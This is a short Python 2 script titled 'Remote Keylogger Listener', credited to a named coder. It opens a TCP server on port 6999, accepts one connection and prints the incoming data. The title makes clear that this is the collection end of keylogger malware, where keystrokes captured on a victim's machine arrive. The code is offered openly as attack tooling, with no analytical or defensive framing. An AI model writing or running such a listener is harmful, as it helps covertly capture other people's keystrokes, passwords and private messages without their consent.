'''
Remote Keylogger Listener
Coder : Tokivena
'''

import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ''
port = 6999
s.bind((host,port))
s.listen(1)
conn, addr = s.accept()
print 'client is at', addr
while 1:
    data = conn.recv(1024)
    sys.stdout.write(data)
    sys.stdout.flush()
    
